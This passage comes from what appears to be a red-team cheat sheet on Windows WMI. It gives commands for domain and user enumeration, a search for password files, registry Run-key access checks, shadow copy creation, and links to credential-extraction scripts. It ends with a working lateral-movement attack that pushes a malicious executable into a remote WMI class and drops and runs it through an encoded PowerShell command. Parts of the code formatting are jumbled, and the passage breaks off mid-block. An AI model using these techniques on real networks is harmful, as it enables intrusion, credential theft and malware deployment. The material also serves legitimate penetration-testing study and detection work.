<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>Get-WmiObject Win32_Process | Select Name, @{Name=&quot;UserName&quot;; Expression={$_.GetOwner().Domain+&quot;\&quot;+$_.GetOwner().User}} | Sort-Object UserName, Name
</span></code></pre></div></p>
<p>Detect virtualization
<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>Get-WmiObject Win32_BIOS -Filter &#39;SerialNumber LIKE &quot;%VMware%&quot;&#39;
</span></code></pre></div></p>
<p>Finding interesting files: Queries all data files on the <em>C:</em> that have a name containing <em>password</em>.
<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>wmic DATAFILE where &quot;drive=&#39;C:&#39; AND Name like &#39;%password%&#39;&quot; GET Name,readable,size /VALUE
</span></code></pre></div></p>
<h2 id="wmi-active-directory-recon">WMI Active Directory Recon</h2>
<p>WMI can be used to get domain object information and realize Active Directory recon and enumeration.  </p>
<p>Listing Domain Users
<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>Get-WMIObject -Class Win32_UserAccount -Filter &quot;DOMAIN = &#39;corp.local&#39;&quot;
</span></code></pre></div></p>
<p>List classes in the LDAP namespace
<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>Get-WmiObject -Namespace root/directory/ldap -List
</span></code></pre></div></p>
<p>Get Current Domain
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>Get-WmiObject -Namespace root/directory/ldap -Class ds_domain | select -ExpandProperty ds_dc
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>(Get-WmiObject -Class Win32_ComputerSystem).Domain
</span></code></pre></div></p>
<p>Get domain policy
<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>Get-WmiObject -Namespace root/directory/lda
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>Get all domain groups
</span></code></pre></div>
<code>p -Class ds_domain | select DS_lockoutDuration, DS_lockoutObservation, DS_lockoutThreshold, DS_maxPwdAge, DS_minPwdAge, DS_minPwdLength, DS_pwdHistoryLength, DS_pwdProperties
<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>Retrieve all member computers and filter only for the Domain Controller
</span></code></pre></div>
Get-WmiObject -Namespace root/directory/ldap -Class ds_computer | Where-Object {$_.ds_userAccountControl -eq 532480} | select ds_cn
<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>Get all domain users/groups
</span></code></pre></div>
Get-WmiObject -Class win32_useraccount
Get-WmiObject -Class win32_group
<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>Get names of all domain users and groups
</span></code></pre></div>
Get-WmiObject -Class win32_useraccount | select name
Get-WmiObject -Class win32_GroupInDomain | Foreach-Object {[wmi]$_.PartComponent}
<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>Get all domain users/groups of another domain with trust relationship
</span></code></pre></div>
Get-WmiObject -Class win32_useraccount -Filter "Domain = 'childone'"
Get-WmiObject -Class win32_GroupInDomain | Where-Object {$_.GroupComponent -match "childone"} | Foreach-Object {[wmi]$_.PartComponent}
<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>Get group membership of the domain admins group for the current and all trusted domains
</span></code></pre></div>
Get-WmiObject -Class Win32_GroupUser | Where-Object {$_.GroupComponent -match "Domain Admins"} | Foreach-Object {[wmi]$_.PartComponent}
<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>Get group membership for specific user
</span></code></pre></div>
Get-WmiObject win32_GroupUser | Where-Object { $_.PartComponent -match "admin"} | Foreach-Object {[wmi]$_.GroupComponent}
<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>## WMI Methods
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>List all methods within *ROOT\CIMV2*  NameSpace
</span></code></pre></div>
Get-WmiObject * -List | where-object {$_.Methods}
Get-CimClass -MethodName Create*
<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>List all methods within by default *ROOT\CIMV2* NameSpace in specific class
</span></code></pre></div>
Get-WmiObject -Class Win32_process -List | select -ExpandProperty Methods
<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>List parameters for specific method *Create* within the *Win32_Proces* within *ROOT\Cimv2* NameSpace
</span></code></pre></div>
Get-CimClass -Class Win32_process | select -ExpandProperty CimClassMethods | where name -eq "Create" | select -ExpandProperty Parameters
<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>Invoke the previously enumerated method *Create* from *Win32_Process* class with *calc.exe* argument as parameter to pop up calc.exe process.
</span></code></pre></div>
Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList calc.exe
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList @(calc.exe)
<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>## Association classes
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>https://raw.githubusercontent.com/dfinke/images/master/acn.png
</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>
</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>Association classes are relationship between WMI classes which can be used to retrieve information about a managed object which is not available from a single class.
</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>
</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>*__RELPATH* property of a WMI class can be used as key to list relationships of this class.
</span></code></pre></div>
Get-wmiobject -class win32_networkadapter | select __RELPATH
Get-WmiObject -Query "Associators Of {Win32_NetworkAdapter.DeviceID=10} where ClassDefsOnly"</code></p>
<h2 id="wmi-console-wmic">WMI Console (WMIC)</h2>
<p>LOLBAS WMIC<br />
- https://lolbas-project.github.io/lolbas/Binaries/Wmic/</p>
<p><img src="./images/wmic_verbs.png" width="500"/></p>
<p>List process
<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>wmic:root\cli&gt; process get name 
</span></code></pre></div></p>
<p>Create a process
<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>wmic:root\cli&gt; process call create calc #Require validation
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>wmic.exe process call create calc #From CMD or PS shell will not require validation
</span></code></pre></div></p>
<h2 id="remote-wmi">Remote WMI</h2>
<p>All WMI cmdlets support the <em>-ComputerName</em> parameter, this can be used for remote operations on remote computers.<br />
--&gt; Remote operation will require <em>Administrative privileges</em><br />
--&gt; WMI use 2 protocols to remote connexion (for CIM cmdlest only through CIM sessions )
    - DCOM : Distributed Component Object Model (port 135)
    - WinRM/WsMan : Windows Remote Management (port 5385/HTTP or 5386/HTTPS) -&gt; FireWall and NAT friendly</p>
<p>--&gt; By default WMI use 1 protocol to remote connexion
    - DCOM : Distributed Component Object Model (port 135)</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>Get-WmiObject -Class Win32_OperatingSystem -ComputerName 192.168.2.10 -Credential company.local\jdoe
</span></code></pre></div>
<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>$sess = New-CimSession -ComputerName 192.168.2.10 -Credential company.local\jdoe
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>Get-CimInstance -CimSession $sess -ClassName Win32_OperatingSystem 
</span></code></pre></div>
<p>Force DCOM usage
<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>$sessionoptions = New-CimSessionOption -Protocol Dcom
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>$sess = New-CimSession -ComputerName 192.168.2.10 -SessionOption $sessionoptions -Credential company.local\jdoe
</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>Get-CimInstance -CimSession $sess -ClassName Win32_OperatingSystem
</span></code></pre></div></p>
<h2 id="registry-key-manipulation">Registry key manipulation</h2>
<p>https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-tasks--registry</p>
<p>WMI provides a class called StdRegProv for interacting with the Windows Registry.<br />
--&gt; An important point to note here is that we need to use the root\DEFAULT namespace for working with the registry<br />
--&gt; We can interact with <em>Remote</em> or <em>Local</em> box  </p>
<p>List all the methods to play with Registry key from <em>StdRegProv</em> class
<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>Get-WmiObject -NameSpace root\default -Class StdRegProv -List | Select -ExpandProperty Methods
</span></code></pre></div></p>
<p>WMI uses constant numeric values to identify different hives in the registry.</p>
<table>
<thead>
<tr>
<th>Variable</th>
<th style="text-align: center;">Value</th>
<th style="text-align: right;">Hive</th>
</tr>
</thead>
<tbody>
<tr>
<td>$HKCR</td>
<td style="text-align: center;">2147483648</td>
<td style="text-align: right;">HKEY_CLASSES_ROOT</td>
</tr>
<tr>
<td>$HKCU</td>
<td style="text-align: center;">2147483649</td>
<td style="text-align: right;">HKEY_CURRENT_USER</td>
</tr>
<tr>
<td>$HKLM</td>
<td style="text-align: center;">2147483650</td>
<td style="text-align: right;">HKEY_LOCAL_MACHINE</td>
</tr>
<tr>
<td>$HKUS</td>
<td style="text-align: center;">2147483651</td>
<td style="text-align: right;">HKEY_USERS</td>
</tr>
<tr>
<td>$HKCC</td>
<td style="text-align: center;">2147483653</td>
<td style="text-align: right;">HKEY_CURRENT_CONFIG</td>
</tr>
</tbody>
</table>
<p>Also WMI uses different data type, and each data type can be accessed using a particular method in WMI.</p>
<table>
<thead>
<tr>
<th>Method</th>
<th style="text-align: center;">Data Type</th>
<th style="text-align: right;">Type value</th>
<th style="text-align: right;">Function</th>
</tr>
</thead>
<tbody>
<tr>
<td>GetStringValue</td>
<td style="text-align: center;">REG_SZ</td>
<td style="text-align: right;">1</td>
<td style="text-align: right;">Returns a string</td>
</tr>
<tr>
<td>GetExpandedStringValue</td>
<td style="text-align: center;">REG_EXPAND_SZ</td>
<td style="text-align: right;">2</td>
<td style="text-align: right;">Returns expanded references to env variables</td>
</tr>
<tr>
<td>GetBinaryValue</td>
<td style="text-align: center;">REG_BINARY</td>
<td style="text-align: right;">3</td>
<td style="text-align: right;">Returns array of bytes</td>
</tr>
<tr>
<td>GetDWORDValue</td>
<td style="text-align: center;">REG_DWORD</td>
<td style="text-align: right;">4</td>
<td style="text-align: right;">Returns a 32-bit number</td>
</tr>
<tr>
<td>GetMultiStringValue</td>
<td style="text-align: center;">REG_MULTI_SZ</td>
<td style="text-align: right;">7</td>
<td style="text-align: right;">Returns multiple string values</td>
</tr>
<tr>
<td>GetQWORDValue</td>
<td style="text-align: center;">REG_QWORD</td>
<td style="text-align: right;">11</td>
<td style="text-align: right;">Returns a 64-bit number</td>
</tr>
</tbody>
</table>
<p>Enumerating HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>Invoke-WmiMethod -Namespace root\default -Class stdregprov -Name EnumKey @(2147483650, &quot;software\microsoft\windows nt\currentversion&quot;) | select -ExpandProperty snames, svalues
</span></code></pre></div>
Reading values: Read subkey value <em>aux</em> under <em>DRIVER32</em> key from HKLM Hive
<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>Invoke-WmiMethod -Namespace root\default -Class stdregprov -Name GetStringValue @(2147483650, &quot;software\microsoft\windows nt\currentversion\drivers32&quot;, &quot;aux&quot;)
</span></code></pre></div></p>
<p>Using WMI you can set or remove registry key using some methods, but you need to use specific constant as for querying the Registry and validate you have rights to modify a specific key.</p>
<p>Validating we have access to a specific registry item. We would need constants defining the access levels to the key.</p>
<table>
<thead>
<tr>
<th>Method</th>
<th style="text-align: center;">Value</th>
<th style="text-align: right;">Function</th>
</tr>
</thead>
<tbody>
<tr>
<td>KEY_QUERY_VALUE</td>
<td style="text-align: center;">1</td>
<td style="text-align: right;">Query the values of a registry key</td>
</tr>
<tr>
<td>KEY_SET_VALUE</td>
<td style="text-align: center;">2</td>
<td style="text-align: right;">Create, delete, or set a registry value</td>
</tr>
<tr>
<td>KEY_CREATE_SUB_KEY</td>
<td style="text-align: center;">4</td>
<td style="text-align: right;">Create a subkey of a registry key</td>
</tr>
<tr>
<td>KEY_ENUMERATE_SUB_KEYS</td>
<td style="text-align: center;">8</td>
<td style="text-align: right;">Enumerate the subkeys of a registry key</td>
</tr>
<tr>
<td>KEY_NOTIFY</td>
<td style="text-align: center;">16</td>
<td style="text-align: right;">Change notifications for a registry key or for subkeys of a registry key</td>
</tr>
<tr>
<td>KEY_CREATE</td>
<td style="text-align: center;">32</td>
<td style="text-align: right;">Create a registry key</td>
</tr>
<tr>
<td>DELETE</td>
<td style="text-align: center;">65536</td>
<td style="text-align: right;">Delete a registry key</td>
</tr>
<tr>
<td>READ_CONTROL</td>
<td style="text-align: center;">131072</td>
<td style="text-align: right;">Combines the STANDARD_RIGHTS_READ, KEY_QUERY_VALUE, KEY_ENUMERATE_SUB_KEYS and KEY_NOTIFY values</td>
</tr>
<tr>
<td>WRITE_DAC</td>
<td style="text-align: center;">262144</td>
<td style="text-align: right;">Modify the DACL in the object’s security descriptor</td>
</tr>
<tr>
<td>WRITE_OWNER</td>
<td style="text-align: center;">524288</td>
<td style="text-align: right;">Change the owner in the object’s security descriptor</td>
</tr>
</tbody>
</table>
<p>You will first need to check the permission for the key you want to modify, in our case 32 to <em>KEY_CREATE</em>
<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>Invoke-WmiMethod -Namespace root\default -Class stdregprov -Name CheckAccess @(2147483649, &quot;software\microsoft\windows\currentversion\run&quot;, 32)
</span></code></pre></div>
This will return a BGRANTED property within the output: True = Privileges Ok to 32 action (32 = KEY_CREATE)</p>
<p><img src="./images/bg_granted.png" width="500"/></p>
<p>Usefull scripts: <br />
- <a href="https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1">Registy.ps1</a>
- <a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1">Get-Information.ps1</a>
- <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-WmiCommand.ps1">Invoke-WmiCommand.ps1</a>
- <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-SessionGopher.ps1">Invoke-SessionGopher.ps1</a></p>
<h2 id="recon-and-information-gathering">Recon and information gathering</h2>
<p>Listing user account present on a system and on the domain with SID.
<strong>Warning</strong>: Because both the Name and Domain are key properties, enumerating Win32_UserAccount on a large network can negatively affect performance.<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>Get-WmiObject -Class Win32_UserAccount
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>
</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>l
</span></code></pre></div></p>
<p>To only list local user account using Win32_UserAccount and avoid reaching domain controller you can try the following script.  </p>
<p><strong>Get-WmiLocalUserAccount.ps1</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>function Get-WmiLocalUserAccount
</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>{
</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>    &lt;#
</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>    .SYNOPSIS
</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>    Gets a WMI `Win32_UserAccount` object for a *local* user account.
</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a>
</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a>    .DESCRIPTION
</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a>    Man, there are so many ways to get a user account in Windows. This function uses WMI to get a local user account. It returns a `Win32_UserAccount` object. The username has to be less than 20 characters. We don&#39;t remember why anymore, but it&#39;s probaly a restriction of WMI. Or Windows. Or both.
</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a>
</span><span id="__span-55-10"><a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a>    You can do this with `Get-WmiObject`, but when you try to get a `Win32_UserAccount`, PowerShell reaches out to your domain and gets all the users it finds, even if you filter by name. This is slow! This function stops WMI from talking to your domain, so it is faster.
</span><span id="__span-55-11"><a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a>
</span><span id="__span-55-12"><a id="__codelineno-55-12" name="__codelineno-55-12" href="#__codelineno-55-12"></a>    .LINK
</span><span id="__span-55-13"><a id="__codelineno-55-13" name="__codelineno-55-13" href="#__codelineno-55-13"></a>    http://msdn.microsoft.com/en-us/library/windows/desktop/aa394507(v=vs.85).aspx
</span><span id="__span-55-14"><a id="__codelineno-55-14" name="__codelineno-55-14" href="#__codelineno-55-14"></a>
</span><span id="__span-55-15"><a id="__codelineno-55-15" name="__codelineno-55-15" href="#__codelineno-55-15"></a>    .EXAMPLE
</span><span id="__span-55-16"><a id="__codelineno-55-16" name="__codelineno-55-16" href="#__codelineno-55-16"></a>    Get-WmiLocalUserAccount -Username Administrator
</span><span id="__span-55-17"><a id="__codelineno-55-17" name="__codelineno-55-17" href="#__codelineno-55-17"></a>
</span><span id="__span-55-18"><a id="__codelineno-55-18" name="__codelineno-55-18" href="#__codelineno-55-18"></a>    Gets the local Administrator account as a `Win32_UserAccount` WMI object.
</span><span id="__span-55-19"><a id="__codelineno-55-19" name="__codelineno-55-19" href="#__codelineno-55-19"></a>    #&gt;
</span><span id="__span-55-20"><a id="__codelineno-55-20" name="__codelineno-55-20" href="#__codelineno-55-20"></a>    [CmdletBinding(SupportsShouldProcess=$true)]
</span><span id="__span-55-21"><a id="__codelineno-55-21" name="__codelineno-55-21" href="#__codelineno-55-21"></a>    param(
</span><span id="__span-55-22"><a id="__codelineno-55-22" name="__codelineno-55-22" href="#__codelineno-55-22"></a>        [Parameter(Mandatory=$true)]
</span><span id="__span-55-23"><a id="__codelineno-55-23" name="__codelineno-55-23" href="#__codelineno-55-23"></a>        [ValidateLength(0,20)]
</span><span id="__span-55-24"><a id="__codelineno-55-24" name="__codelineno-55-24" href="#__codelineno-55-24"></a>        [string]
</span><span id="__span-55-25"><a id="__codelineno-55-25" name="__codelineno-55-25" href="#__codelineno-55-25"></a>        # The username of the local user to get.
</span><span id="__span-55-26"><a id="__codelineno-55-26" name="__codelineno-55-26" href="#__codelineno-55-26"></a>        $Username
</span><span id="__span-55-27"><a id="__codelineno-55-27" name="__codelineno-55-27" href="#__codelineno-55-27"></a>    )
</span><span id="__span-55-28"><a id="__codelineno-55-28" name="__codelineno-55-28" href="#__codelineno-55-28"></a>
</span><span id="__span-55-29"><a id="__codelineno-55-29" name="__codelineno-55-29" href="#__codelineno-55-29"></a>    Set-StrictMode -Version &#39;Latest&#39;
</span><span id="__span-55-30"><a id="__codelineno-55-30" name="__codelineno-55-30" href="#__codelineno-55-30"></a>
</span><span id="__span-55-31"><a id="__codelineno-55-31" name="__codelineno-55-31" href="#__codelineno-55-31"></a>    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState
</span><span id="__span-55-32"><a id="__codelineno-55-32" name="__codelineno-55-32" href="#__codelineno-55-32"></a>
</span><span id="__span-55-33"><a id="__codelineno-55-33" name="__codelineno-55-33" href="#__codelineno-55-33"></a>    return Get-WmiObject Win32_UserAccount -Filter &quot;Domain=&#39;$($env:ComputerName)&#39; and Name=&#39;$Username&#39;&quot;
</span><span id="__span-55-34"><a id="__codelineno-55-34" name="__codelineno-55-34" href="#__codelineno-55-34"></a>}
</span></code></pre></div></p>
<p>Listing local and domain groups
<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>Get-WmiObject -Class Win32_Group
</span></code></pre></div></p>
<p>Create shadow copy of C: Drive
<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>(Get-WmiObject -Class Win32_ShadowCopy -List).create(&quot;C:\&quot;, &quot;ClientAccessible&quot;)
</span></code></pre></div></p>
<p>Create a symlink for the created shadow copy
<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>$link = (Get-WmiObject -Class Win32_ShadowCopy).DeviceObject + &quot;\&quot;
</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>cmd /c mklink /d C:\shadowcopy &quot;$link&quot;
</span></code></pre></div></p>
<h2 id="exploitation">Exploitation</h2>
<p>Extracts and decrypts saved session information for software typically used to access Unix systems. <a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-SessionGopher.ps1">Invoke-SessionGopher.ps1</a></p>
<h2 id="lateral-movement">Lateral movement</h2>
<h4 id="wmi-attacks-c2-communication-wmi-class-push-attack">WMI Attacks – C2 Communication (WMI Class) – “Push” Attack</h4>
<ul>
<li>https://github.com/mattifestation/WMI_Backdoor</li>
</ul>
<p><strong>First Step</strong> - Push file contents to remote WMI repository
<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a># Prep file to drop on remote system
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>$LocalFilePath = &#39;C:\Users\lutz\Documents\maliciousfile.exe&#39;
</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>$FileBytes = [IO.File]::ReadAllBytes($LocalFilePath)
</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a>$EncodedFileContentsToDrop = [Convert]::ToBase64String($FileBytes)
</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a># Establish remote WMI connection
</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a>$Options = New-Object Management.ConnectionOptions
</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a>$Options.Username = &#39;Administrator&#39;
</span><span id="__span-59-8"><a id="__codelineno-59-8" name="__codelineno-59-8" href="#__codelineno-59-8"></a>$Options.Password = &#39;user&#39;
</span><span id="__span-59-9"><a id="__codelineno-59-9" name="__codelineno-59-9" href="#__codelineno-59-9"></a>$Options.EnablePrivileges = $True
</span><span id="__span-59-10"><a id="__codelineno-59-10" name="__codelineno-59-10" href="#__codelineno-59-10"></a>$Connection = New-Object Management.ManagementScope
</span><span id="__span-59-11"><a id="__codelineno-59-11" name="__codelineno-59-11" href="#__codelineno-59-11"></a>$Connection.Path = &#39;\\192.168.2.10\root\default&#39;
</span><span id="__span-59-12"><a id="__codelineno-59-12" name="__codelineno-59-12" href="#__codelineno-59-12"></a>$Connection.Options = $Options
</span><span id="__span-59-13"><a id="__codelineno-59-13" name="__codelineno-59-13" href="#__codelineno-59-13"></a>$Connection.Connect()
</span><span id="__span-59-14"><a id="__codelineno-59-14" name="__codelineno-59-14" href="#__codelineno-59-14"></a># &quot;Push&quot; file contents
</span><span id="__span-59-15"><a id="__codelineno-59-15" name="__codelineno-59-15" href="#__codelineno-59-15"></a>$EvilClass = New-Object Management.ManagementClass($Connection, [String]::Empty, $null)
</span><span id="__span-59-16"><a id="__codelineno-59-16" name="__codelineno-59-16" href="#__codelineno-59-16"></a>$EvilClass[&#39;__CLASS&#39;] = &#39;Win32_EvilClass&#39;
</span><span id="__span-59-17"><a id="__codelineno-59-17" name="__codelineno-59-17" href="#__codelineno-59-17"></a>$EvilClass.Properties.Add(&#39;EvilProperty&#39;, [Management.CimType]::String, $False)
</span><span id="__span-59-18"><a id="__codelineno-59-18" name="__codelineno-59-18" href="#__codelineno-59-18"></a>$EvilClass.Properties[&#39;EvilProperty&#39;].Value = $EncodedFileContentsToDrop
</span><span id="__span-59-19"><a id="__codelineno-59-19" name="__codelineno-59-19" href="#__codelineno-59-19"></a>$EvilClass.Put()
</span></code></pre></div></p>
<p><strong>Second Step</strong> - Drop file contents to remote system
<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>$Credential = Get-Credential &#39;CORP.local\admin&#39;
</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>$CommonArgs = @{
</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>Credential = $Credential
</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>ComputerName = &#39;192.168.2.10&#39;
</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>}
</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6" href="#__codelineno-60-6"></a>$PayloadText = @&#39;
</span><span id="__span-60-7"><a id="__codelineno-60-7" name="__codelineno-60-7" href="#__codelineno-60-7"></a>$EncodedFile = ([WmiClass] &#39;root\default:Win32_EvilClass&#39;).Properties[&#39;EvilProperty&#39;].Value
</span><span id="__span-60-8"><a id="__codelineno-60-8" name="__codelineno-60-8" href="#__codelineno-60-8"></a>[IO.File]::WriteAllBytes(&#39;C:\reconstructedMaliciousFile.exe&#39;, [Convert]::FromBase64String($EncodedFile))
</span><span id="__span-60-9"><a id="__codelineno-60-9" name="__codelineno-60-9" href="#__codelineno-60-9"></a>&#39;@
</span><span id="__span-60-10"><a id="__codelineno-60-10" name="__codelineno-60-10" href="#__codelineno-60-10"></a>$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))
</span><span id="__span-60-11"><a id="__codelineno-60-11" name="__codelineno-60-11" href="#__codelineno-60-11"></a>$PowerShellPayload = &quot;powershell -NoProfile -EncodedCommand $EncodedPayload&quot;
</span><span id="__span-60-12"><a id="__codelineno-60-12" name="__codelineno-60-12" href="#__codelineno-60-12"></a># Drop it like it&#39;s hot
</span><span id="__span-60-13"><a id="__codelineno-60-13" name="__codelineno-60-13" href="#__codelineno-60-13"></a>Invoke-WmiMethod @CommonArgs -Class Win32_Process -Name Create -ArgumentList $PowerShellPayload
</span><span id="__span-60-14"><a id="__codelineno-60-14" name="__codelineno-60-14" href="#__codelineno-60-14"></a># Confirm successful file drop
</span><span id="__span-60-15"><a id="__codelineno-60-15" name="__codelineno-60-15" href="#__codelineno-60-15"></a>Get-WmiObject @CommonArgs -Class CIM_DataFile -Filter &#39;Name = &quot;C:\\reconstructedMaliciousFile.exe&quot;&#39;
